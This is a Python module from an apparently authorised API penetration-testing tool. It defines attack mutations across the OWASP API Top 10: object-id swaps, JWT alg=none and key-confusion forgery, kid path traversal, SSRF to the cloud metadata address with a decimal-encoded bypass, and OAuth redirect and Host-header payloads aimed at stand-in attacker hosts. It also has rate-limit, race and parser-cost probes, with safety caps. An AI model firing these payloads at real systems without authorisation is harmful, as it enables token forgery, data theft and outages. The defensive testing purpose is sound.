"""Apply an attack mutation to a baseline request.

Each mutation is a named, understood transformation — the runner knows exactly
what it changed, which is what lets the verdict be explained in terms of the
attack ("swapped the object id to another persona's") instead of guessed from a
status code. Unknown mutation kinds are rejected, not improvised.

`MUTATION_KINDS` is the authoritative vocabulary. It is deliberately a closed
registry rather than an open string field: it is the allowlist an AI planner is
constrained to, and the list a reviewer audits when asking "what can this tool
actually send?". Adding a kind means adding a reviewed handler here — there is
no path from a generated test case to an unimplemented behaviour.

A mutation that cannot do its job raises MutationError rather than returning the
request unchanged. Silently sending an unmutated request would come back as a
clean PASS, which is the worst possible outcome: a false negative that looks
like assurance.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from app.execution import jwt_tools
from app.schemas.enums import OwaspApiCategory
from app.schemas.testcase import Mutation, RequestSpec
from app.vault.personas import Persona, PersonaVault


class MutationError(Exception):
    pass


# --- safety ceilings ---------------------------------------------------------
# These bound what the platform can emit regardless of what a test spec (or an
# AI planner, or a hand-edited DB row) asks for. The point of an API4/API6 probe
# is to observe the *target's* limit, never to become the outage.
_MAX_OVERSIZED_PAYLOAD_BYTES = 10_000_000
_MAX_REPEAT = 50  # requests per multi-request mutation
_MAX_JSON_DEPTH = 500  # well under CPython's own recursion ceiling
_MAX_PAGINATION = 10_000_000


@dataclass
class PreparedRequest:
    method: str
    path: str
    headers: dict[str, str]
    query: dict[str, str]
    body: object | None
    note: str  # human summary of what the mutation did
    # "json" | "form" — how `body` is serialised on the wire. Content-type
    # confusion is itself an authorization-bypass technique, so it has to be
    # expressible as data rather than assumed.
    body_encoding: str = "json"
    # Multi-request probes (rate limits, business-flow abuse, race windows).
    repeat: int = 1
    concurrent: bool = False


@dataclass(frozen=True)
class MutationSpec:
    """Registry metadata for one mutation kind."""

    kind: str
    category: OwaspApiCategory
    summary: str
    multi_request: bool = False
    # True when the mutation is meaningless without a second identity to
    # attack (BOLA family). Used to reject a test case before it runs and
    # produces a misleading result.
    needs_target_persona: bool = False


@dataclass
class _Req:
    """Mutable working copy handed to a handler."""

    method: str
    path: str
    headers: dict[str, str]
    query: dict[str, str]
    body: object | None
    body_encoding: str = "json"
    repeat: int = 1
    concurrent: bool = False
    note: str = ""


@dataclass
class _Env:
    """Everything a handler may read: identities, vault, runtime context."""

    attacker: Persona
    target: Persona | None
    vault: PersonaVault
    context: dict


# --- shared helpers ----------------------------------------------------------


def _normalize_id_key(name: str) -> str:
    """`customerId`, `customer_id` and `CUSTOMER-ID` are the same field."""
    return re.sub(r"[^a-z0-9]", "", name.lower())


def victim_object_id(id_field: str, env: _Env) -> str:
    """Resolve the object id belonging to the *victim* for a BOLA-family probe.

    Deliberately refuses to guess. The previous behaviour — fall back to the
    victim's first owned id whatever it was — silently sent an order endpoint a
    customer id, drew a 404, and recorded PASS. An attack aimed at the wrong
    object does not test anything, so an ambiguous lookup is an error the
    operator must resolve, not a coin flip the report will present as assurance.

    Resolution order: exact context key → exact `owns` key → name-normalised
    match in either → the sole owned id if the victim owns exactly one.
    """
    ctx = env.context
    if ctx.get(id_field) is not None:
        return str(ctx[id_field])

    if env.target is None:
        raise MutationError(
            f"'{id_field}' is not in the run context and the test declares no "
            "target_persona, so there is no victim object to aim at. Set "
            "auth_context.target_persona, or capture the id in a setup step."
        )

    owns = env.target.owns
    if id_field in owns:
        return str(owns[id_field])

    want = _normalize_id_key(id_field)
    matches = [v for k, v in owns.items() if _normalize_id_key(k) == want]
    matches += [v for k, v in ctx.items() if _normalize_id_key(k) == want and v is not None]
    # Compare VALUES, not occurrences. The runtime context is seeded from the
    # victim's `owns`, so a single id is always found twice — once in each — and
    # counting occurrences declared every ordinary BOLA probe ambiguous. Two
    # spellings carrying the same id is agreement; only genuinely different
    # values are a question the operator has to answer.
    distinct = {str(v) for v in matches if v is not None}
    if len(distinct) == 1:
        return distinct.pop()
    if len(distinct) > 1:
        raise MutationError(
            f"'{id_field}' matches {len(distinct)} different values for persona "
            f"'{env.target.name}' ({sorted(distinct)}); cannot decide which object to target."
        )

    if not owns:
        raise MutationError(
            f"Persona '{env.target.name}' owns no object ids, so a BOLA-family "
            "probe has nothing to target. Add `owns` entries to the persona in "
            "the engagement config."
        )
    if len(owns) == 1:
        return str(next(iter(owns.values())))

    raise MutationError(
        f"Persona '{env.target.name}' owns {sorted(owns)} — none named like "
        f"'{id_field}'. Refusing to guess which object the test means: aiming "
        "at the wrong object yields a 404 that would be misread as 'access "
        "correctly denied'. Name the persona's id key to match the endpoint's "
        "parameter, or set the id explicitly in the mutation detail."
    )


def _as_dict_body(req: _Req) -> dict:
    return dict(req.body) if isinstance(req.body, dict) else {}


def _capped_int(detail: dict, key: str, default: int, ceiling: int) -> int:
    try:
        value = int(detail.get(key, default))
    except (TypeError, ValueError):
        value = default
    return max(1, min(value, ceiling))


def _mutate_bearer(req: _Req, transform) -> str:
    """Apply `transform(header, payload, signature) -> new_token` to the request's
    bearer credential, writing the result back. Returns the header name used."""
    name, token = jwt_tools.bearer_token(req.headers)
    header, payload, signature = jwt_tools.split(token)
    req.headers[name] = f"Bearer {transform(header, payload, signature)}"
    return name


# --- verbatim replay ---------------------------------------------------------
# Not an attack transformation — the opposite case the module docstring warns
# about, deliberately. Every other mutation exists to change something and
# raises if it cannot; this one exists to change *nothing*, for a PoC that is
# already a complete, working exploit (a ticket's embedded script) rather than
# a captured "normal" request waiting to be turned into one. Injecting a
# generic mass-assignment/BOLA mutation on top of an exploit a researcher
# already hand-crafted (specific ids, specific body, specific missing header)
# would send different bytes than the ones they proved worked. Used only by
# `to_test_cases(..., verbatim=True)` (ticket_poc mode) — never proposed by the
# AI planner or picked by `classify()` for any other import path.


def _verbatim_replay(req: _Req, m: Mutation, env: _Env) -> None:
    # `req.headers` already carries the attacker persona's own auth_headers
    # merged in as a default (apply_mutation sets that up before any handler
    # runs) — exactly the thing a PoC proving "no credential needed" must NOT
    # gain. `detail["headers"]` is the PoC's own extracted headers, stashed
    # there by to_test_cases(verbatim=True) for exactly this reason; force
    # back to precisely that set, discarding whatever the persona would
    # otherwise have contributed.
    headers = m.detail.get("headers")
    if headers is not None:
        req.headers = dict(headers)
    req.note = "replayed verbatim — no mutation applied, sent exactly as extracted"


# --- API1: object-level authorization ---------------------------------------


def _swap_object_id(req: _Req, m: Mutation, env: _Env) -> None:
    id_key = m.detail.get("id_field", "victim_id")
    victim_id = victim_object_id(id_key, env)
    # Publish it under the template name the request path uses, so
    # `/customers/{customerId}` resolves to the victim's object downstream.
    env.context[id_key] = victim_id
    req.note = f"targeted object id {victim_id} owned by another identity"


def _swap_id_in_query(req: _Req, m: Mutation, env: _Env) -> None:
    field_name = m.detail.get("field", "id")
    victim_id = victim_object_id(m.detail.get("id_field", field_name), env)
    req.query[field_name] = victim_id
    req.note = f"set query parameter '{field_name}' to another identity's object id {victim_id}"


def _swap_id_in_header(req: _Req, m: Mutation, env: _Env) -> None:
    # Some APIs scope a request by a client-supplied header (X-Account-Id,
    # X-Tenant-Id) and trust it. That is authorization by request header.
    header_name = m.detail.get("header", "X-Account-Id")
    victim_id = victim_object_id(m.detail.get("id_field", header_name), env)
    req.headers[header_name] = victim_id
    req.note = f"set header '{header_name}' to another identity's id {victim_id}"


def _id_param_pollution(req: _Req, m: Mutation, env: _Env) -> None:
    """Send the attacker's own id AND the victim's for the same parameter.

    Frameworks disagree on which duplicate wins: an authorization filter that
    reads the first occurrence while the data layer reads the last is a bypass
    that neither component looks buggy on its own.
    """
    field_name = m.detail.get("field", "id")
    victim_id = victim_object_id(m.detail.get("id_field", field_name), env)
    own_id = m.detail.get("own_id") or next(iter(env.attacker.owns.values()), "1")
    # httpx serialises a list value as repeated key=…&key=…
    req.query[field_name] = [str(own_id), str(victim_id)]  # type: ignore[assignment]
    req.note = (
        f"sent '{field_name}' twice — own id {own_id} then victim id {victim_id} "
        "(parameter-pollution bypass: filter and data layer may read different occurrences)"
    )


def _wrap_id_array(req: _Req, m: Mutation, env: _Env) -> None:
    """Wrap the identifier in an array. An authorization check written for a
    scalar frequently passes an array straight through to the query layer."""
    field_name = m.detail.get("field", "id")
    victim_id = victim_object_id(m.detail.get("id_field", field_name), env)
    own_id = m.detail.get("own_id") or next(iter(env.attacker.owns.values()), "1")
    body = _as_dict_body(req)
    body[field_name] = [str(own_id), str(victim_id)]
    req.body = body
    req.note = f"wrapped '{field_name}' as an array containing the victim id {victim_id}"


def _content_type_switch(req: _Req, m: Mutation, env: _Env) -> None:
    """Resend the same parameters under a different content type.

    Authorization middleware that only parses JSON bodies commonly ignores a
    form-encoded one entirely while the framework still binds it to the model.
    """
    encoding = m.detail.get("to", "form")
    if encoding not in {"form", "json"}:
        raise MutationError(f"content_type_switch: unsupported target encoding {encoding!r}")
    body = _as_dict_body(req)
    if not body:
        raise MutationError(
            "content_type_switch needs a dict body to re-encode; this request has none."
        )
    req.body = body
    req.body_encoding = encoding
    req.headers["Content-Type"] = (
        "application/x-www-form-urlencoded" if encoding == "form" else "application/json"
    )
    req.note = f"re-encoded an identical body as {encoding} to bypass content-type-bound authorization"


def _set_dotted(body: dict, dotted: str, value: object) -> None:
    cursor = body
    parts = str(dotted).split(".")
    for part in parts[:-1]:
        nxt = cursor.get(part)
        if not isinstance(nxt, dict):
            nxt = {}
            cursor[part] = nxt
        cursor = nxt
    cursor[parts[-1]] = value


def _swap_id_in_body(req: _Req, m: Mutation, env: _Env) -> None:
    """Put the victim's id in a body field (`{"customerId": ...}`, `owner.id`).

    Many APIs authorize on the path id but trust an id carried in the body, so
    a write addressed to the attacker's own object can still be aimed at
    someone else's through the payload.
    """
    field_name = m.detail.get("field", "id")
    victim_id = victim_object_id(m.detail.get("id_field", field_name), env)
    body = _as_dict_body(req)
    _set_dotted(body, field_name, victim_id)
    req.body = body
    req.note = f"set body field '{field_name}' to another identity's object id {victim_id}"


_ID_FORMAT_VARIANTS = ("zero", "negative", "me", "wildcard", "null", "uppercase", "padded", "url_encoded")


def _mutate_id_format(req: _Req, m: Mutation, env: _Env) -> None:
    """Re-spell the object id so a parser and its authorization check disagree.

    `0`, `-1`, `me`, `*` and `null` probe special-case resolution ("the current
    user", "all"); case, zero-padding and percent-encoding of the victim's own
    id probe a check that compares the raw string while the data layer
    normalises it.
    """
    variant = str(m.detail.get("variant", "zero"))
    if variant not in _ID_FORMAT_VARIANTS:
        raise MutationError(
            f"mutate_id_format: unknown variant {variant!r}; use one of {list(_ID_FORMAT_VARIANTS)}"
        )
    id_key = m.detail.get("id_field", "victim_id")
    fixed = {"zero": "0", "negative": "-1", "me": "me", "wildcard": "*", "null": "null"}
    if variant in fixed:
        value = fixed[variant]
    else:
        victim_id = victim_object_id(id_key, env)
        value = {
            "uppercase": victim_id.upper() if victim_id.upper() != victim_id else victim_id + "A",
            "padded": "00" + victim_id,
            "url_encoded": "".join(f"%{ord(c):02x}" for c in victim_id),
        }[variant]
    env.context[id_key] = value
    req.note = f"re-spelled the object id as {value!r} ({variant}) to test id normalisation"


# --- API2: authentication ----------------------------------------------------


def _drop_auth(req: _Req, m: Mutation, env: _Env) -> None:
    req.headers = {k: v for k, v in req.headers.items() if k.lower() != "authorization"}
    req.note = "removed the Authorization header (unauthenticated request)"


def _tamper_token(req: _Req, m: Mutation, env: _Env) -> None:
    token = m.detail.get("token", "Bearer invalid.tampered.token")
    req.headers["Authorization"] = token
    req.note = "replaced the credential with a malformed/expired token"


def _jwt_alg_none(req: _Req, m: Mutation, env: _Env) -> None:
    """Strip the signature and declare `alg: none`. A verifier that honours the
    header's algorithm claim accepts an unsigned token as authentic."""

    def transform(header, payload, _sig):
        header = {**header, "alg": m.detail.get("alg", "none")}
        return jwt_tools.assemble(header, payload, "")

    _mutate_bearer(req, transform)
    req.note = "re-issued the caller's own JWT with alg=none and an empty signature"


def _jwt_alg_confusion(req: _Req, m: Mutation, env: _Env) -> None:
    """Downgrade an asymmetric token to HMAC and sign with a guessable key."""
    key = m.detail.get("key", "secret")

    def transform(header, payload, _sig):
        header = {**header, "alg": "HS256"}
        return jwt_tools.sign_hs256(header, payload, key)

    _mutate_bearer(req, transform)
    req.note = f"downgraded the JWT to HS256 and re-signed it with the weak key {key!r}"


def _jwt_claim_tamper(req: _Req, m: Mutation, env: _Env) -> None:
    """Edit claims while keeping the ORIGINAL signature.

    This is the cleanest possible signature-verification test: the token is
    cryptographically invalid, so any acceptance proves the server never checked.
    """
    claims = m.detail.get("claims") or {"role": "admin"}
    if not isinstance(claims, dict):
        raise MutationError("jwt_claim_tamper: 'claims' must be an object")

    def transform(header, payload, sig):
        return jwt_tools.assemble(header, {**payload, **claims}, sig)

    _mutate_bearer(req, transform)
    req.note = f"rewrote JWT claims {sorted(claims)} while keeping the original signature"


def _jwt_header_injection(req: _Req, m: Mutation, env: _Env) -> None:
    """Add header parameters that tell a verifier where to find its key
    (`jku`, `x5u`, `jwk`), keeping the original signature. A verifier that
    fetches or trusts them is steerable; one that verifies the signature
    against a pinned key rejects the token regardless."""
    headers = m.detail.get("headers") or {"jku": m.detail.get("jku_url", "")}
    headers = {k: v for k, v in headers.items() if v}
    if not headers:
        raise MutationError(
            "jwt_header_injection needs detail['headers'] or detail['jku_url'] "
            "(point it at a collaborator/OAST host you control)."
        )

    def transform(header, payload, sig):
        return jwt_tools.assemble({**header, **headers}, payload, sig)

    _mutate_bearer(req, transform)
    req.note = f"added JWT header parameter(s) {sorted(headers)} while keeping the original signature"


def _jwt_expired_replay(req: _Req, m: Mutation, env: _Env) -> None:
    """Backdate `exp`/`nbf`, keeping the original signature. Distinguishes
    "expiry is enforced" from "expiry is merely present in the token"."""
    exp = int(m.detail.get("exp", 946_684_800))  # 2000-01-01, unambiguously past

    def transform(header, payload, sig):
        return jwt_tools.assemble(header, {**payload, "exp": exp, "iat": exp - 60}, sig)

    _mutate_bearer(req, transform)
    req.note = f"backdated the JWT exp to {exp} (long expired), signature untouched"


def _jwt_kid_injection(req: _Req, m: Mutation, env: _Env) -> None:
    """Point `kid` at attacker-influenced key material. `kid` is frequently
    used as a filesystem path or SQL lookup with no sanitisation."""
    kid = m.detail.get("kid", "../../dev/null")

    def transform(header, payload, sig):
        return jwt_tools.assemble({**header, "kid": kid}, payload, sig)

    _mutate_bearer(req, transform)
    req.note = f"injected kid={kid!r} into the JWT header (key-lookup traversal probe)"


def _borrowed_token(req: _Req, m: Mutation, env: _Env) -> None:
    """Present another persona's *valid* credential.

    Meaningful only when the request path is scoped to a different tenant than
    the borrowed token: it then answers "is this token bound to its audience,
    or does any valid token open any tenant?" Paired with a tenant-scoped path
    by the designer; on its own it merely reproduces that persona's access.
    """
    persona_name = m.detail.get("persona")
    if not persona_name:
        raise MutationError("borrowed_token requires detail['persona'] naming whose token to use.")
    lender = env.vault.get(persona_name)
    if not lender.auth_headers:
        raise MutationError(f"Persona '{persona_name}' has no credential to borrow.")
    req.headers = {k: v for k, v in req.headers.items() if k.lower() != "authorization"}
    req.headers.update(lender.auth_headers)
    req.note = f"presented persona '{persona_name}'s valid credential from another identity's context"


# --- API3: object property level authorization -------------------------------


def _inject_property(req: _Req, m: Mutation, env: _Env) -> None:
    extra = m.detail.get("properties", {})
    if not isinstance(extra, dict) or not extra:
        raise MutationError("inject_property requires a non-empty detail['properties'] object.")
    body = _as_dict_body(req)
    req.body = {**body, **extra}
    req.note = f"injected protected propert(ies): {sorted(extra)}"


def _inject_nested_property(req: _Req, m: Mutation, env: _Env) -> None:
    """Set a dotted path, e.g. `user.role`. Allowlists written against
    top-level field names routinely miss nested ones."""
    dotted = m.detail.get("path")
    if not dotted:
        raise MutationError("inject_nested_property requires detail['path'], e.g. 'user.role'.")
    value = m.detail.get("value", "admin")
    body = _as_dict_body(req)
    cursor = body
    parts = str(dotted).split(".")
    for part in parts[:-1]:
        nxt = cursor.get(part)
        if not isinstance(nxt, dict):
            nxt = {}
            cursor[part] = nxt
        cursor = nxt
    cursor[parts[-1]] = value
    req.body = body
    req.note = f"injected nested property {dotted}={value!r}"


# --- API4: resource consumption ----------------------------------------------


def _oversized_payload(req: _Req, m: Mutation, env: _Env) -> None:
    field_name = m.detail.get("field", "q")
    size = _capped_int(m.detail, "size", 100_000, _MAX_OVERSIZED_PAYLOAD_BYTES)
    req.query[field_name] = "A" * size
    req.note = f"sent an oversized '{field_name}' ({size} bytes)"


def _pagination_abuse(req: _Req, m: Mutation, env: _Env) -> None:
    """Ask for an unbounded page. Costs the server, not the client — the
    asymmetry that makes it a resource-consumption issue rather than a slow query."""
    field_name = m.detail.get("field", "limit")
    size = _capped_int(m.detail, "value", 1_000_000, _MAX_PAGINATION)
    req.query[field_name] = str(size)
    req.note = f"requested an unbounded page via '{field_name}={size}'"


def _json_depth_bomb(req: _Req, m: Mutation, env: _Env) -> None:
    """Deeply nested JSON — cheap to send, expensive to parse recursively."""
    depth = _capped_int(m.detail, "depth", 100, _MAX_JSON_DEPTH)
    nested: object = "x"
    for _ in range(depth):
        nested = {"a": nested}
    body = _as_dict_body(req)
    body[m.detail.get("field", "payload")] = nested
    req.body = body
    req.note = f"sent a {depth}-level nested JSON structure (parser-cost probe)"


def _rate_probe(req: _Req, m: Mutation, env: _Env) -> None:
    req.repeat = _capped_int(m.detail, "count", 20, _MAX_REPEAT)
    req.note = f"sent the same request {req.repeat}x in sequence to probe for rate limiting"


def _graphql_batching_abuse(req: _Req, m: Mutation, env: _Env) -> None:
    """Batch one GraphQL operation N times into a single HTTP request.

    GraphQL's own array-batching (supported by Apollo Server, graphql-http
    and most reference implementations) lets one HTTP call carry many
    operations. A rate limiter or resource cap written in terms of requests
    per second never sees the difference between 1 operation and N batched
    into one request — the resource cost this actually asks the server to
    do scales with N, but `rate_probe`'s repeat-the-HTTP-request approach
    cannot exercise this path at all, which is why it is a distinct kind
    rather than a `rate_probe` variant. Capped the same as every other
    multi-request-shaped probe in this registry, even though it is
    mechanically a single HTTP request.
    """
    count = _capped_int(m.detail, "count", 20, _MAX_REPEAT)
    query = str(m.detail.get("query", "{ __typename }"))
    req.method = str(m.detail.get("method", "POST")).upper()
    req.body = [{"query": query} for _ in range(count)]
    req.note = (
        f"batched {count} GraphQL operations into one HTTP request to test whether "
        "rate/cost limiting accounts for batching, not just request count"
    )


# --- API5: function level authorization --------------------------------------


def _escalate_persona(req: _Req, m: Mutation, env: _Env) -> None:
    """Invoke a privileged function as a low-privileged identity.

    Also strips client-supplied scoping headers the server may be trusting: if
    authorization is decided by a header the client controls, removing or
    keeping it changes the answer, and either way the control is not server-side.

    The default list is generic guesses. A real target's scoping header
    (e.g. "entity-context") is rarely one of them, so it is unioned with
    whatever the attacker persona declares in `scoping_headers` — configured
    once on the persona rather than repeated in every test case's
    `detail["strip_headers"]`.
    """
    strip = list(m.detail.get("strip_headers", ["X-Role", "X-Scope", "X-Tenant-Id", "X-Is-Admin"]))
    strip += env.attacker.scoping_headers
    lowered = {str(h).lower() for h in strip}
    removed = [k for k in req.headers if k.lower() in lowered]
    for k in removed:
        del req.headers[k]
    req.note = f"invoked a privileged function as role '{env.attacker.role}'" + (
        f"; stripped client-controlled scoping header(s) {removed}" if removed else ""
    )


def _method_override(req: _Req, m: Mutation, env: _Env) -> None:
    """Smuggle a privileged verb through a permitted one. Gateways and WAFs
    authorize the outer method; the framework often honours the override header."""
    target_method = str(m.detail.get("method", "DELETE")).upper()
    via = str(m.detail.get("via", "header"))
    name = m.detail.get("header" if via == "header" else "field",
                        "X-HTTP-Method-Override" if via == "header" else "_method")
    if via == "header":
        req.headers[name] = target_method
    elif via == "query":
        req.query[name] = target_method
    elif via == "body":
        body = _as_dict_body(req)
        body[name] = target_method
        req.body = body
    else:
        raise MutationError(f"method_override: 'via' must be header, query or body, got {via!r}")
    req.note = (
        f"kept the outer {req.method} but requested {target_method} via "
        f"{via} '{name}' (verb smuggling past method-based authorization)"
    )


_SWITCHABLE_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"}


def _method_switch(req: _Req, m: Mutation, env: _Env) -> None:
    """Send the request with a different HTTP verb.

    Routers that register a handler per verb sometimes attach the authorization
    decorator to only some of them, so the same path is protected for GET and
    open for PUT — or answers TRACE/OPTIONS with more than it should.
    """
    method = str(m.detail.get("method", "PUT")).upper()
    if method not in _SWITCHABLE_METHODS:
        raise MutationError(f"method_switch: unsupported method {method!r}")
    req.note = f"re-sent {req.path} as {method} instead of {req.method}"
    req.method = method


_PATH_VARIANTS = ("uppercase", "double_slash", "dot_segment", "trailing_slash", "semicolon")


def _path_normalization_bypass(req: _Req, m: Mutation, env: _Env) -> None:
    """Spell the same route so a gateway's path rule and the framework's router
    disagree (upper-case, a doubled slash, a trailing `/.`  or `/`, or a matrix
    parameter). Only literal segments are touched: `{id}` templates survive."""
    variant = str(m.detail.get("variant", "uppercase"))
    if variant not in _PATH_VARIANTS:
        raise MutationError(
            f"path_normalization_bypass: unknown variant {variant!r}; use one of {list(_PATH_VARIANTS)}"
        )
    path = str(m.detail.get("path") or req.path)
    if path.startswith(("http://", "https://")):
        raise MutationError("path_normalization_bypass: path must be relative; absolute URLs bypass scope.")
    segments = path.split("/")
    literal = [i for i, s in enumerate(segments) if s and not (s.startswith("{") and s.endswith("}"))]
    if not literal:
        raise MutationError("path_normalization_bypass: the path has no literal segment to rewrite.")
    first = literal[0]
    if variant == "uppercase":
        new_path = "/".join(s.upper() if i in literal else s for i, s in enumerate(segments))
    elif variant == "double_slash":
        new_path = "/" + path if path.startswith("/") else "//" + path
    elif variant == "dot_segment":
        new_path = path.rstrip("/") + "/."
    elif variant == "trailing_slash":
        new_path = path.rstrip("/") + "/"
    else:  # semicolon
        segments[first] = segments[first] + ";x=1"
        new_path = "/".join(segments)
    req.note = f"re-spelled {req.path} as {new_path} ({variant}) to test path-based access rules"
    req.path = new_path


def _admin_path_swap(req: _Req, m: Mutation, env: _Env) -> None:
    """Point the same identity at the administrative variant of the route."""
    new_path = m.detail.get("path")
    if not new_path:
        new_path = "/admin" + (req.path if req.path.startswith("/") else f"/{req.path}")
    new_path = str(new_path)
    if new_path.startswith("http://") or new_path.startswith("https://"):
        raise MutationError("admin_path_swap: path must be relative; absolute URLs bypass scope.")
    req.note = f"re-aimed the request from {req.path} at the privileged route {new_path}"
    req.path = new_path


# --- API6: sensitive business flows ------------------------------------------


def _repeat_flow(req: _Req, m: Mutation, env: _Env) -> None:
    req.repeat = _capped_int(m.detail, "count", 10, _MAX_REPEAT)
    req.note = (
        f"executed the sensitive business flow {req.repeat}x as a single identity "
        "(automation-abuse probe)"
    )


def _race_condition(req: _Req, m: Mutation, env: _Env) -> None:
    """Fire N identical requests concurrently.

    Targets the window between a check and its commit — the classic cause of
    double-spend, coupon reuse and limit bypass. Sequential repetition cannot
    find it, which is why this is a distinct kind rather than a flag.
    """
    req.repeat = _capped_int(m.detail, "count", 10, _MAX_REPEAT)
    req.concurrent = True
    req.note = (
        f"fired {req.repeat} identical requests concurrently to probe the "
        "check-to-commit window (TOCTOU / double-spend)"
    )


# --- API7: server side request forgery ---------------------------------------


def _place_url_payload(req: _Req, field_name: str, payload: str) -> None:
    if isinstance(req.body, dict):
        req.body = {**req.body, field_name: payload}
    else:
        req.query[field_name] = payload


def _ssrf_url(req: _Req, m: Mutation, env: _Env) -> None:
    field_name = m.detail.get("field", "url")
    payload = m.detail.get("value", "http://169.254.169.254/latest/meta-data/")
    _place_url_payload(req, field_name, payload)
    req.note = f"set server-side URL field '{field_name}' to internal target {payload}"


def _ssrf_url_bypass(req: _Req, m: Mutation, env: _Env) -> None:
    """Same destination, written so a naive string blocklist does not recognise it.

    A filter that rejects the literal "169.254.169.254" while the HTTP client
    happily resolves its decimal form is filtering spelling, not destinations.
    """
    field_name = m.detail.get("field", "url")
    payload = m.detail.get("value", "http://2852039166/latest/meta-data/")  # decimal 169.254.169.254
    _place_url_payload(req, field_name, payload)
    req.note = (
        f"set '{field_name}' to an obfuscated encoding of the metadata address "
        f"({payload}) — blocklist-evasion probe"
    )


# --- API8: security misconfiguration -----------------------------------------


def _cors_probe(req: _Req, m: Mutation, env: _Env) -> None:
    # "null" is what a sandboxed iframe or a file:// page sends — an allowlist
    # written as "reflect whatever isn't obviously absent" often waves it through.
    origin = m.detail.get("origin", "https://evil.example")
    req.headers["Origin"] = str(origin)
    req.note = f"sent Origin: {origin} to see whether the CORS policy reflects arbitrary origins"


def _debug_probe(req: _Req, m: Mutation, env: _Env) -> None:
    """Ask the application to be verbose. Debug surfaces left enabled outside
    development leak stack traces, config and internal hostnames."""
    for header, value in (m.detail.get("headers") or {"X-Debug": "true", "X-Debug-Mode": "1"}).items():
        req.headers[str(header)] = str(value)
    for key, value in (m.detail.get("query") or {"debug": "true", "trace": "1"}).items():
        req.query[str(key)] = str(value)
    req.note = "requested debug/verbose output via debug headers and query flags"


def _security_headers_probe(req: _Req, m: Mutation, env: _Env) -> None:
    """An intentionally unmodified request. The assertion is entirely on the
    RESPONSE headers, so there is nothing to mutate — but it still goes through
    the same approval, scope and evidence path as every other probe."""
    req.note = "sent an unmodified authenticated request to inspect response hardening headers"


def _host_header_injection(req: _Req, m: Mutation, env: _Env) -> None:
    """Send an attacker-controlled Host / X-Forwarded-Host.

    A framework that builds an absolute URL — a password-reset link, a
    redirect, a cache key — from whichever of these the client supplied,
    rather than from a server-configured origin, lets an attacker plant a
    phishing link inside an otherwise legitimate email or poison a shared
    cache entry. The assertion lives entirely in the response body/headers
    (does a reset link or Location echo the injected host back?), so nothing
    here touches where the request actually connects: TCP still goes to the
    scope-validated, DNS-pinned address: this only changes what the header
    claims, the same way `escalate_persona` changes a claimed role without
    changing who is asking.
    """
    evil_host = str(m.detail.get("host", "evil.attacker.example"))
    headers = m.detail.get("headers") or ["Host", "X-Forwarded-Host"]
    for header in headers:
        req.headers[str(header)] = evil_host
    req.note = (
        f"set {', '.join(headers)} to '{evil_host}' to probe whether an absolute URL in "
        "the response (reset link, redirect, cache key) trusts a client-supplied host"
    )


# --- API9: inventory management ----------------------------------------------

_GRAPHQL_INTROSPECTION_QUERY = (
    "query IntrospectionProbe { __schema { queryType { name } "
    "mutationType { name } types { name kind } } }"
)


def _graphql_introspection_probe(req: _Req, m: Mutation, env: _Env) -> None:
    """Ask a GraphQL endpoint to describe its own schema.

    Introspection ships ON by default in most GraphQL frameworks. Left
    enabled in production it hands an attacker the full, authoritative map of
    every query, mutation and type the API exposes — self-reported by the
    target rather than reconstructed from documentation or guesswork, which
    is precisely the "attack surface the operator does not know is exposed"
    failure API9 (Improper Inventory Management) names. The request replaces
    the body outright, the same way `undocumented_path_probe` replaces the
    path: the point is this exact query, not a mutation of whatever the
    ticket's endpoint normally sends.
    """
    req.method = str(m.detail.get("method", "POST")).upper()
    req.body = {"query": str(m.detail.get("query", _GRAPHQL_INTROSPECTION_QUERY))}
    req.note = "sent a GraphQL introspection query to check whether schema disclosure is enabled"


_VERSION_RE = re.compile(r"/v(\d+)(?=/|$)", re.IGNORECASE)


def _version_downgrade(req: _Req, m: Mutation, env: _Env) -> None:
    """Re-aim at an older API version. Superseded versions routinely survive in
    production with the previous generation's (weaker) authorization."""
    explicit = m.detail.get("to")
    if explicit:
        new_path = str(explicit)
    else:
        match = _VERSION_RE.search(req.path)
        if not match:
            raise MutationError(
                f"version_downgrade found no /vN/ segment in {req.path!r}; "
                "supply detail['to'] with the explicit older path."
            )
        current = int(match.group(1))
        if current <= 1:
            raise MutationError(
                f"version_downgrade: {req.path!r} is already at v{current}; "
                "nothing older to request."
            )
        new_path = f"{req.path[:match.start()]}/v{current - 1}{req.path[match.end():]}"
    if new_path.startswith("http://") or new_path.startswith("https://"):
        raise MutationError("version_downgrade: path must be relative; absolute URLs bypass scope.")
    req.note = f"re-aimed {req.path} at the superseded version {new_path}"
    req.path = new_path


def _undocumented_path_probe(req: _Req, m: Mutation, env: _Env) -> None:
    """Request a path that should not be publicly reachable (spec dumps,
    actuators, admin consoles). Presence itself is the finding."""
    new_path = str(m.detail.get("path", "/openapi.json"))
    if new_path.startswith("http://") or new_path.startswith("https://"):
        raise MutationError("undocumented_path_probe: path must be relative; absolute URLs bypass scope.")
    req.method = str(m.detail.get("method", "GET")).upper()
    req.body = None
    req.note = f"probed for an undocumented/administrative surface at {new_path}"
    req.path = new_path


# --- API10: unsafe consumption of APIs ---------------------------------------


def _unsafe_redirect_url(req: _Req, m: Mutation, env: _Env) -> None:
    """Hand the server an upstream URL that redirects somewhere internal.

    Definitive results need a collaborator host you control: point
    detail['value'] at one that answers 302 → internal. The default is a
    self-evidently internal destination, which detects only the weakest case
    (no validation at all, redirect chasing unrestricted).
    """
    field_name = m.detail.get("field", "url")
    payload = m.detail.get("value", "http://169.254.169.254/latest/meta-data/")
    _place_url_payload(req, field_name, payload)
    req.note = (
        f"pointed the third-party URL field '{field_name}' at {payload} to test whether "
        "upstream responses/redirects are validated before being consumed"
    )


def _oauth_redirect_uri_bypass(req: _Req, m: Mutation, env: _Env) -> None:
    """Replace an OAuth/OIDC `redirect_uri` with an unregistered destination.

    Distinct from `unsafe_redirect_url`: that mutation tests a server-side
    fetch following an attacker URL (SSRF-shaped — the API's own backend is
    the one making the request). This tests the authorization endpoint's
    validation of where it redirects the USER's browser after login — if it
    accepts any `redirect_uri` rather than one from a registered allowlist,
    the authorization code or token in that redirect goes straight to
    whatever host the attacker named, the open-redirect-via-OAuth-flow
    variant of unsafe consumption.
    """
    field_name = m.detail.get("field", "redirect_uri")
    payload = str(m.detail.get("value", "https://evil.attacker.example/callback"))
    _place_url_payload(req, field_name, payload)
    req.note = (
        f"set OAuth parameter '{field_name}' to an unregistered redirect target "
        f"({payload}) to test whether the authorization endpoint validates it "
        "against a registered allowlist before redirecting the user's browser"
    )


# --- registry ----------------------------------------------------------------

